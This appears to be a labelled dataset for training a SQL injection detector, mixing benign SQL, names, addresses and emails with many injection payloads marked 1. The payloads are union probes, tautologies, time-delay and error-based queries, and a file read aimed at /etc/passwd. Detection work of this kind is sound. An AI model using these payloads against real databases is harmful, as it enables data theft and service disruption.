Query,Label
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( ""woun"" like ""woun",1
"1 ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1
dalmacio,0
"1"" ) where 9545 = 9545 and 9198 = 9198--",1
"SELECT this, union, throat FROM hope WHERE replied IS NULL",0
1' ) and 7533 = 7533 and ( 'cryr' = 'cryr,1
DELETE FROM agree WHERE burn = 'raise',0
2.23935E+15,0
yessica,0
SELECT ProductName FROM Products,0
6.71628E+15,0
SELECT COUNT ( lakeID ) FROM point,0
1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'iuki' = 'iuki,1
"1"" ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ""vdyr"" = ""vdyr",1
"-9014%' ) union all select 4211,4211,4211,4211,4211,4211#",1
"calle monte miramar, s/n",0
1' ) ) rlike sleep ( 5 ) #,1
"1%"" ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ""%"" = """,1
SELECT * FROM capital,0
"1"" ) ) ) and 7533 = 7533 and ( ( ( ""alvd"" like ""alvd",1
06327548h,0
"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'pphf' = 'pphf",1
"1'|| ( select 'zvpl' where 5877 = 5877 union all select null,null#",1
select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1
"1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1
SELECT AVG ( Price ) FROM supply,0
"1%' ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( '%' = '",1
"coslada 83, 4g",0
"UPDATE operation SET bat = 'below', City = 'ice' WHERE president = fell",0
"1"" ) as vqkz where 8536 = 8536",1
mccauley@autobuses-hibridos.ph,0
"1' ) as yjdg where 5262 = 5262 union all select null,null,null#",1
cebrones del ro,0
p563l5os1,0
37188,0
calle arins 87 4?e,0
SELECT TOP 3 * FROM hung WHERE pan = 'practical' SELECT * FROM fed,0
"SELECT Employees.report, COUNT ( Orders.withinID ) AS thingFROM ( OrdersINNER JOIN cookies ON Orders.hunterID = Employees.shownID )",0
"1 ) as nlig where 5964 = 5964 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'xzcr' = 'xzcr",1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""ewsr"" like ""ewsr",1
-7319 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),1
"SELECT ADDTIME ( ""2017-06-15 09:34:21.000001"", ""2:10:5.000003"" ) ;",0
"SELECT barn, although, around FROM without WHERE speed IS NULL",0
alegra,0
6.29894E+15,0
SELECT * FROM stems FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM property WHERE congress = 'additional' AND ( during = 'dark' OR street = 'stick' ),0
"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'obax' like 'obax",1
"-6000"" ) where 1797 = 1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",1
equivalentemente,0
"INSERT INTO help ( grandfather, lungs, trail, time, closer, tongue ) VALUES ( 'mistake', 'means'. surprise', 'outer', 'porch', 'beside', 'captain' )",0
yamasaki@multaspendientes.eg,0
"-8364' ) union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",1
minera dauns,0
AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.DATABASE_NAME FROM DUAL ) ) AND 'i' = 'i,1
SELECT wonderful FROM effort UNION ALL SELECT former FROM so ORDER BY center,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( '%' = '",1
melanson,0
grodecki,0
"-6580' ) union all select 9950,9950,9950,9950,9950,9950--",1
"SELECT force, game, island FROM helpful WHERE pine IS NULL",0
"1"" where 2072 = 2072 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
SELECT * FROM change WHERE five = 'lungs' FETCH FIRST 3 ROWS ONLY,0
SELECT dish ( s ) FROM jet,0
"SELECT * FROM simple WHERE too IN ( 'since', 'still', 'stone' )",0
SELECT of ( s ) FROM fact INNER JOIN,0
"1%"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""%"" = """,1
hemisfero,0
zein,0
SELECT AVG ( over ) FROM court,0
SELECT AVG ( necessary ) FROM fat SELECT SUM ( appropriate ),0
"1'+ ( select nzij where 5456 = 5456 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ) +'",1
"-3361 where 1335 = 1335 or elt ( 5891 = 5092,5092 ) --",1
1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'dqoz' like 'dqoz,1
SELECT * FROM store FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM nuts,0
SELECT * FROM bag WHERE should = 'bar' OR lower = 'difference',0
SELECT AVG ( Price ) FROM effort,0
corcoll duhalde,0
SELECT coffee ( s ) FROM neighborhood UNION ALL,0
"SELECT piece,lunch,rush,information,part ( ( definition JOIN value ON bad.silver = plant.vegetable ) INNER JOIN sidesON Orders.wall = vote.baseID )",0
"1"" ) where 4878 = 4878 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",1
milly7,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",1
1' ) where 7252 = 7252,1
"1%"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""%"" = """,1
"SELECT mostID AS ID, my AS principle FROM sheep",0
SELECT AVG ( indicate ) FROM composed SELECT SUM ( forty ),0
end and ( 4610 = 4610,1
SELECT * FROM hungry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM range,0
"1%"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,1
0x770061006900740066006F0072002000640065006C00 ...,1
SELECT characteristic ( s ) FROM hello,0
SELECT farther ( s FROM refer RIGHT JOIN,0
"calle vereda del carmen, 160 11-e",0
"1%' ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'wcmt' = 'wcmt",1
thayra,0
78739097t,0
"SELECT * FROM report WHERE kept BETWEEN ""powerful"" AND ""route""",0
morales de toro,0
"1"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""ozvp"" = ""ozvp",1
SELECT TOP 3 * FROM grew SELECT * FROM sang 3SELECT * FROM am,0
"consolacion 92, 12?h",0
SELECT kill ( s ) FROM lamp SELECT am FROM lay,0
"1"" ) as nfpe where 2679 = 2679",1
thomasin,0
"calle manuel de falla, 65 5?a",0
"1%"" ) ) ) and elt ( 9524 = 1124,1124 ) and ( ( ( ""%"" = """,1
76,0
"SELECT grandfatherID AS ID, friend AS edge FROM fact",0
select * from users where id = '1' or $<\ or 1 = 1 -- 1',1
SELECT * FROM all WHERE level = 'might' LIMIT 3,0
"SELECT sentence,imagine,another FROM brass LEFT JOIN Orders ON having.mannerID = tune.generally ORDER BY snow.discover",0
"-5509%"" ) ) ) union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",1
1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'bwtk' = 'bwtk,1
"1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'qfwc' = 'qfwc",1
"SELECT highway AS think, passage AS [cold] FROM planning",0
"-6112"" ) union all select 8203,8203,8203,8203,8203,8203,8203--",1
1' and ( 3020 = 3020 ) *6703 and 'tmng' like 'tmng,1
SELECT * FROM writer WHERE Price NOT BETWEEN 10 AND 20,0
prueckner@helicopter.com.gf,0
1'|| ( select 'jslz' where 8405 = 8405 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) ||',1
FROM ( SELECT DISTINCT building FROM win ),0
if ( 3245 = 6168 ) select 3245 else drop function nafj--,1
"1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'swjk' = 'swjk",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN ( 367656 ),0
"1',exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 7759 = 7759,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1
1'|| ( select 'qgnz' where 6446 = 6446,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 430 ) ORDER BY meta_id ASC",0
SELECT COUNT ( cake ) FROM porch,0
SELECT City FROM Customers UNION,0
"1"" ) where 5065 = 5065",1
"1 where 6095 = 6095 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"1 ) where 5232 = 5232 union all select null,null,null#",1
2331,0
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%"" = """,1
SELECT * FROM correctly WHERE NOT including = 'know' AND NOT breathing = 'block',0
1 where 2060 = 2060,1
"SELECT Employees.aside, COUNT ( Orders.governmentID ) AS thickFROM ( OrdersINNER JOIN cheese ON Orders.steadyID = Employees.happenedID )",0
SELECT * FROM my WHERE NOT of = 'minerals' AND NOT people = 'reader',0
"1"" ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""mjkl"" = ""mjkl",1
"1"" ) ) union all select null--",1
FROM ( SELECT DISTINCT dug FROM over ),0
"1, ( select ( case when ( 3888 = 3888 ) then ( select count ( * ) from generate_series ( 1,5000000 ) ) else 1/ ( select 0 ) end ) )",1
SELECT * FROM sitting FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT open ( s ) FROM color UNION ALL,0
6.18738E+15,0
SELECT AVG ( furniture ) FROM luck SELECT SUM ( anyone ),0
or,1
-6661' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'tbmu' like 'tbmu,1
"1"" where 6004 = 6004",1
lewwis.mall@epbx.pg,0
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( '%' = '",1
"-1184"" ) ) ) union all select 1482--",1
"1"" ) as ubva where 6369 = 6369 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
SELECT option_value FROM wp_options WHERE option_name = 'sm_gae' LIMIT 1,0
SELECT * FROM task WHERE meal = 'kill' OR southern = 'enjoy',0
marcos esculta,0
"SELECT pack,ourselves,dirty,church,basket ( ( nice JOIN couple ON fur.made = blood.still ) INNER JOIN answerON Orders.slipped = nine.fearID )",0
SELECT earn ( s ) FROM good,0
SELECT * FROM ProductsWHERE ProductName NOT BETWEEN 'Carnarvon Tigers' AND 'Mozzarella di Giovanni',0
SELECT * FROM of WHERE unknown = shout,0
DELETE FROM function,0
SELECT feet ( s ) FROM contain SELECT swimming FROM topic,0
SELECT * FROM widely,0
1'|| ( select 'vvpn' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||',1
"SELECT good, tobacco, compare FROM impossible WHERE contrast IS NULL",0
1' ) ) and 2832 = 4165--,1
7.75E+15,0
"1'|| ( select 'zpwe' from dual where 7743 = 7743 union all select null,null#",1
92106863m,0
"1 ) where 5336 = 5336 union all select null,null,null,null,null,null,null,null,null,null#",1
"1"" where 2619 = 2619 and 2823 = 5100#",1
nebila,0
1' and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1
-4523 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1
rosngela,0
"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",1
voseo,0
"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",1
"SELECT ourselvesID AS ID, table AS call FROM branch",0
"1' ) ) as mjps where 2179 = 2179 union all select null,null,null,null,null,null,null--",1
2100,0
"UPDATE case SET answer = 'cheese', City = 'party' WHERE social = cannot",0
SELECT * FROM ( SELECT maybe FROM moment ),0
"chorrito bajo, 11",0
"SELECT announced,noon FROM beginning WHERE brown = 'cave' UNION SELECT foot, quiet FROM rabbit",0
SELECT * FROM Customers WHERE City LIKE '%es%';,0
-6712' ) ) as kqff where 9146 = 9146 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
6246,0
SELECT * FROM collect WHERE every BETWEEN distant09/01/1996honor AND near15/31/1996element,0
1'+ ( select 'phtz' where 3171 = 3171,1
"SELECT rod, create, seldomFROM happily WHERE idea IS NOT NULL",0
"-4230"" ) ) ) union all select 6962,6962,6962,6962,6962,6962#",1
SELECT City FROM Customers UNION ALL,0
"1%"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""%"" = """,1
"-9923%' ) ) ) union all select 8985,8985,8985,8985,8985,8985,8985#",1
"1'+ ( select 'nmhy' where 2919 = 2919 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
-9688%' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = ',1
"1"" ) as pobe where 1704 = 1704",1
roda deita,0
62776679l,0
"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ""dtwv"" like ""dtwv",1
carricar,0
"SELECT underline,in,whispered,eight,brave ( ( command JOIN rise ON jar.bank = strong.heavy ) INNER JOIN oceanON Orders.crew = frighten.chanceID )",0
UPDATE away SET glad = 'riding'WHERE purple = 'suppose',0
mercador,0
SELECT TOP 3 * FROM name WHERE tiny = 'ice' SELECT * FROM gain,0
"INSERT INTO giving ( rod, simplest, dot ) VALUES ( 'court', 'badly', 'plain' )",0
japan,0
1 ) ) as zykv where 2158 = 2158,1
1' in boolean mode ) or sleep ( 5 ) #,1
select sleep ( 5 ) # wihl,1
"aldea de san nicols, la",0
1' ) as sagj where 4558 = 4558,1
-6449' ) ) or 2590 = 2848,1
89c3via,0
"1' where 8360 = 8360 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
1' ) where 4277 = 4277 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1
belva,0
"1"" ) ) ) or sleep ( 5 ) #",1
SELECT * FROM television WHERE yesterday NOT LIKE 'other%',0
DELETE FROM label,0
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 'pnst' = 'pnst",1
""" or ""x"" = ""x",1
"SELECT * FROM means WHERE science BETWEEN ""leaving"" AND ""title""",0
"1"" where 6347 = 6347 union all select null,null,null,null,null,null,null,null#",1
1 ) ) and 4637 = 1408 and ( ( 6509 = 6509,1
1' or sleep ( 5 ) and 'yudo' = 'yudo,1
6o40o41,0
nydia,0
admin' or '1' = '1'--,1
select * from users where id = 1 +1 or 1 = 1 -- 1,1
1%' ) ) waitfor delay '0:0:5'--,1
1 ) as obzn where 7652 = 7652 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,1
SELECT * FROM also FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM powder,0
SELECT * FROM happy WHERE establish BETWEEN complete09/01/1996basic AND within15/31/1996wish,0
SELECT * FROM model WHERE NOT mail = 'exactly',0
"1"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""qkds"" like ""qkds",1
"select * from users where id = '1' union select +\,@@VERSION -- 1'",1
SELECT COUNT ( die ) FROM syllable,0
"SELECT theory,minerals,attempt FROM leg LEFT JOIN Orders ON write.itselfID = country.stone ORDER BY together.seeing",0
"-1844"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""abdw"" like ""abdw",1
-7230' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'khtc' = 'khtc,1
"1' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and 'vwve' like 'vwve,1
"SELECT Orders.experimentrID, Employees.why, Employees.biggest FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.describeID ORDER BY Orders.instrumentID",0
musi@inmobiliariahangar.vn,0
"1"" ) where 5850 = 5850 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"-7350' ) ) ) union all select 9207,9207,9207,9207--",1
SELECT * FROM onto WHERE equally = 'square' AND ( guess = 'snake' OR break = 'bare' ),0
62,0
"1' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'cdaq' like 'cdaq",1
1'+ ( select enzd where 6046 = 6046 and ( 3020 = 3020 ) *6703 ) +',1
1212,0
SELECT * FROM charge WHERE vessels BETWEEN property09/01/1996hearing AND coffee15/31/1996year,0
"1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'lshk' like 'lshk",1
1820,0
522lta,0
( select ( case when ( 3592 = 3592 ) then 3592 else 3592* ( select 3592 from information_schema.character_sets ) end ) ),1
SELECT * FROM keep WHERE wheel = 'sharp' LIMIT 3,0
matzenauer@evelin.com.ci,0
6.31786E+15,0
"select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1",1
SELECT * FROM private WHERE out = 'plane' AND ( needed = 'sheep' OR blanket = 'receive' ),0
65119692e,0
"INSERT INTO safety ( swam, alphabet, bean, character, blood, tree ) VALUES ( 'pass', 'dropped'. verb', 'chapter', 'important', 'way', 'zebra' )",0
SELECT COUNT ( forgot ) FROM gun,0
") or benchmark ( 10000000,MD5 ( 1 ) ) #",1
-9327' ) or 3038 = 3038,1
SELECT * FROM art,0
SELECT * FROM anyway WHERE master = 'title',0
"SELECT aroundID AS ID, appearance AS aid FROM child",0
1' or '1' = '1,1
SELECT neighbor ( s ) FROM wide UNION ALL,0
hi' or 1 = 1 --,1
1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1
berghof@esbien.bt,0
-8519%' ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( '%' = ',1
DELETE FROM headed,0
22234,0
SELECT below ( s ) FROM dear UNION,0
4.43193E+15,0
"-7313"" ) where 3606 = 3606 union all select 3606#",1
SELECT * FROM picture,0
"-4669"" or 8571 = 8571--",1
SELECT * FROM drop WHERE human = 'unknown' LIMIT 3,0
SELECT * FROM ( SELECT bag FROM until ),0
SELECT * FROM also,0
aliaguilla,0
1' ) where 9817 = 9817,1
"-6158"" ) union all select 3084,3084,3084,3084,3084,3084#",1
"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""tfok"" like ""tfok",1
SELECT * FROM surrounded FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( select ) FROM machine,0
san emiliano,0
napolen,0
"1"" ) where 3727 = 3727 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1
16124624z,0
"SELECT Employees.familiar, COUNT ( Orders.grainID ) AS tapeFROM ( OrdersINNER JOIN introduced ON Orders.youthID = Employees.fingerID )",0
' AND (SELECT * FROM (SELECT(pg_sleep(6)))a) --,1
1%' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( '%' = ',1
"SELECT book,field,front,size,it ( ( such JOIN forty ON program.movie = club.equipment ) INNER JOIN oldestON Orders.favorite = tent.thoseID )",0
SELECT * FROM smile WHERE finally = 'generally' OR engineer = 'adventure',0
"1 ) as estm where 4809 = 4809 union all select null,null,null--",1
5672,0
"1' union all select null,null--",1
"1"" and ( 3020 = 3020 ) *6703 and ""itpt"" = ""itpt",1
SELECT * FROM breathing,0
dziawa,0
"select * from users where id = 1 union select 1<@,version ( ) -- 1",1
SELECT * FROM origin WHERE sudden = 'least' OR least = 'solid',0
SELECT DISTINCT ability FROM it,0
cerinza,0
"1 ) ) as oqfr where 6426 = 6426 and make_set ( 8403 = 8403,8899 ) --",1
"select sleep ( 5 ) and ""%"" = """,1
SELECT * FROM return WHERE NOT song = 'construction' AND NOT willing = 'cap',0
SELECT easier ( s FROM giving RIGHT JOIN,0
"select * from users where id = '1' union select \#,@@VERSION -- 1'",1
2u27lad9r4,0
SELECT * FROM will FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM letter WHERE flight = 'underline' AND ( dance = 'basket' OR appearance = 'magnet' ),0
"-9197%"" ) ) ) union all select 1040,1040,1040,1040,1040,1040,1040,1040,1040#",1
1' ) order by 1--,1
"1"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
"-4176'+ ( select 'muio' where 4256 = 4256 union all select 4256,4256,4256,4256,4256,4256#",1
fresia,0
"rio nervion, 177",0
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,1
"SELECT final,new,key,manufacturing,happy ( ( he JOIN potatoes ON process.no = community.central ) INNER JOIN stoppedON Orders.pale = mixture.highestID )",0
"UPDATE hunter SET directly = 'from', City = 'rocky' WHERE any = general",0
"1"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""xqlh"" = ""xqlh",1
26%,1
hi9dra,0
"-8002' ) ) ) union all select 6647,6647,6647--",1
SELECT TOP 50 PERCENT * FROM report SELECT * FROM yesterday FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM spirit,0
shakor,0
) ) or pg_sleep ( __TIME__ ) --,1
"calle da unidade, 184 7e",0
1'|| ( select 'pcps' from dual where 7255 = 7255 and 7121 = 4603,1
"-6924' ) union all select 2046,2046,2046,2046,2046,2046,2046--",1
mcanally@rockefeller.bt,0
SELECT * FROM forth WHERE lay = 'along' OR diagram = 'rich',0
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",1
jengibre,0
